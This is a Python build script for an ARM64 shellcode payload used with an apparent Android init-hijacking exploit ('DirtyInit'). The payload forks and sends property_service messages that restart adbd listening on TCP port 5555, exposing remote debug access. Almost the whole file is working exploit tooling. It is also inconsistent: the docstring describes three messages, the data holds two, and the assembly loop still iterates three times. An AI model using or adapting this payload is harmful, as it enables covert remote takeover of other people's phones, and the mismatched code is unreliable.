#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Build a custom payload_576.bin for the DirtyInit APK.

After the page-cache exploit hijacks init's ~LogMessage, this shellcode
automatically enables ADB over TCP 5555:
  - one-shot marker /dev/.adb55 (O_CREAT|O_EXCL)
  - fork (clone SIGCHLD); parent returns via the original restore path
  - child sends 3 messages to /dev/socket/property_service:
        service.adb.tcp.port=5555
        ctl.stop=adbd
        ctl.start=adbd
    and exits; init restarts adbd which then listens on TCP 5555

Layout contract required by the APK patcher:
  [0x000..0x00F] entry stub (copied verbatim by phase 3)
  [0x010..0x1F7] code + literals
  [0x1F8..0x203] register restore (ldp x21,x22 / x19,x20 / x0,x30)
  [0x204..0x217] patched by APK with original prologue
  [0x218]       patched by APK with B-to-epilogue
  [0x21C..0x23F] padding
"""
import sys
from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN

RESTORE_OFF = 0x1F8
END = 0x240

CODE = """
    // entry stub (bytes 0..15)
    stp x0, x30, [sp, #-0x10]!
    stp x19, x20, [sp, #-0x10]!
    stp x21, x22, [sp, #-0x10]!
    mov x8, #0xae
    svc #0
    cbnz w0, restore
    mov x8, #0xac
    svc #0
    cmp w0, #1
    b.ne restore

    // one-shot marker
    mov x0, #-100
    adr x1, marker
    mov x2, #0xc1
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, restore
    mov x8, #57
    svc #0

    // fork (clone SIGCHLD)
    mov x0, #0x11
    mov x1, xzr
    mov x2, xzr
    mov x3, xzr
    mov x4, xzr
    mov x8, #220
    svc #0
    cbnz w0, restore

    // child: sockaddr_un for /dev/socket/property_service
    sub sp, sp, #0x40
    stp xzr, xzr, [sp]
    stp xzr, xzr, [sp, #0x10]
    stp xzr, xzr, [sp, #0x20]
    stp xzr, xzr, [sp, #0x30]
    mov w9, #1
    strh w9, [sp, #6]
    adr x9, sockpath
    ldp x10, x11, [x9]
    ldp x12, x13, [x9, #0x10]
    stp x10, x11, [sp, #8]
    stp x12, x13, [sp, #24]

    // loop over 3 (offset,len) pairs
    adr x20, msgtab
    mov x21, x20
    mov x22, #3
loop:
    ldp w9, w10, [x21], #8
    mov x0, #1
    mov x1, #1
    mov x2, xzr
    mov x8, #198
    svc #0
    mov x19, x0
    mov x0, x19
    mov x1, sp
    add x1, x1, #6
    mov x2, #31
    mov x8, #203
    svc #0
    add x1, x20, x9
    mov x2, x10
    mov x0, x19
    mov x8, #64
    svc #0
    mov x0, x19
    mov x8, #57
    svc #0
    subs w22, w22, #1
    b.ne loop

    // child exit
    mov x0, #0
    mov x8, #93
    svc #0
"""

RESTORE = """
restore:
    ldp x21, x22, [sp], #0x10
    ldp x19, x20, [sp], #0x10
    ldp x0, x30, [sp], #0x10
"""

MARKER_S = b"/dev/.adb55\x00"
SOCKPATH_S = b"/dev/socket/property_service\x00"


def _wire(name: bytes, value: bytes) -> bytes:
    import struct as _s
    return (_s.pack("<I", 0x00020001) + _s.pack("<I", len(name)) + name
            + _s.pack("<I", len(value)) + value)


MSGS = [_wire(b"service.adb.tcp.port", b"5555"),
        _wire(b"ctl.restart", b"adbd")]
MSG_BLOB = b"".join(MSGS)
NOP4 = bytes([0x1f, 0x20, 0x03, 0xd5])


def align(x, a=8):
    return (x + a - 1) // a * a


def byte_directive(data):
    if not data:
        return ""
    return ".byte " + ", ".join("0x%02x" % b for b in data)


def build():
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)

    def asm(text):
        enc, _ = ks.asm(text, addr=0)
        return bytes(enc)

    # pass 1: code size (labels defined right after code, no bytes)
    probe = CODE + "\nmarker:\nsockpath:\nmsgtab:\nrestore:\n"
    code_len = len(asm(probe))
    data_start = align(code_len)
    msgtab = data_start
    table_len = 8 * len(MSGS)
    msgblob = msgtab + table_len
    marker = align(msgblob + len(MSG_BLOB))
    sockpath = align(marker + len(MARKER_S))
    data_end = sockpath + len(SOCKPATH_S)
    if data_end > RESTORE_OFF:
        raise SystemExit("data overflows restore offset: %#x > 0x%x" % (data_end, RESTORE_OFF))

    table = bytearray()
    off = msgblob - msgtab
    for m in MSGS:
        table += off.to_bytes(4, "little") + len(m).to_bytes(4, "little")
        off += len(m)

    parts = [CODE]
    parts.append(".org 0x%x" % msgtab)
    parts.append("msgtab:")
    parts.append(byte_directive(table))
    parts.append(".org 0x%x" % msgblob)
    parts.append("msgblob:")
    parts.append(byte_directive(MSG_BLOB))
    parts.append(".org 0x%x" % marker)
    parts.append("marker:")
    parts.append(byte_directive(MARKER_S))
    parts.append(".org 0x%x" % sockpath)
    parts.append("sockpath:")
    parts.append(byte_directive(SOCKPATH_S))
    parts.append(".org 0x%x" % RESTORE_OFF)
    parts.append("restore:")
    ORIG_TAIL = bytes.fromhex(
        "f55bc1a8f353c1a8e07bc1a81f2003d51f2003d51f2003d51f2003d51f2003d5"
        "1f2003d51f2003d5000100142f6465762f2e646669000000006466695f696e6974"
        "00000000000000")
    assert len(ORIG_TAIL) == END - RESTORE_OFF, len(ORIG_TAIL)
    parts.append(".byte " + ", ".join("0x%02x" % b for b in ORIG_TAIL))
    full = "\n".join(parts)
    blob = asm(full)

    if len(blob) != END:
        raise SystemExit("unexpected size %#x" % len(blob))

    return blob, dict(code_len=code_len, data_start=data_start, msgtab=msgtab,
                      msgblob=msgblob, marker=marker, sockpath=sockpath, data_end=data_end)


if __name__ == "__main__":
    blob, info = build()
    print("code_len =", hex(info["code_len"]))
    print("layout   =", {k: hex(v) for k, v in info.items()})
    print("size     =", len(blob), hex(len(blob)))
    print("entry    =", blob[0:16].hex())
    print("restore  =", blob[RESTORE_OFF:RESTORE_OFF + 12].hex())
    print("marker@", hex(blob.find(MARKER_S)), "sock@", hex(blob.find(SOCKPATH_S)),
          "table@", hex(blob.find(bytes(info['msgtab'] * 0 + b""))) if False else "")
    out = sys.argv[1] if len(sys.argv) > 1 else "payload_576.bin"
    open(out, "wb").write(blob)
    print("written", out)
